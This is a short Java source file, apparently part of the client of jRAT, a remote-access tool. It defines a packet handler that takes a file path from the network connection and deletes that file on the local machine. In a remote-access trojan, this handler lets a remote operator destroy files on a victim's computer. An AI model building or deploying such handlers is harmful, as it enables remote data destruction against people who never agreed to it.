package jrat.client.packets.incoming;

import jrat.client.Connection;
import java.io.File;


public class Packet16DeleteFile extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();
		File f = new File(file);
		if (f.exists()) {
			f.delete();
		}

	}

}
